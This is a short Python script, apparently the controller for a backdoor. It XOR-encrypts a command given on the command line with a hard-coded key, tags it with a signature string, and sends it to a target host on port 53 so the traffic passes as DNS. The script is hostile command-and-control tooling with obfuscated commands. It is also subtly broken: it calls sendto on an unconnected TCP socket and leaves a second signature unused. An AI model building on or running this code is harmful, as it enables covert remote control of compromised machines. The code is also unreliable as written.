
import sys
import socket
from itertools import cycle


if len(sys.argv) < 2:
    print("Usage: to less arguments")
    sys.exit()

PORT = 53
HOST = sys.argv[1]
COMMAND = sys.argv[2]

SIGNATURE_ONE = "cr49s"
SIGNATURE_TWO = "32pld"
KEY = "@DNJI(HSNA872w"

encyptedCommand = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(COMMAND, cycle(KEY)))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    payload = (SIGNATURE_ONE + encyptedCommand).encode()
    s.sendto(payload, (HOST, PORT))

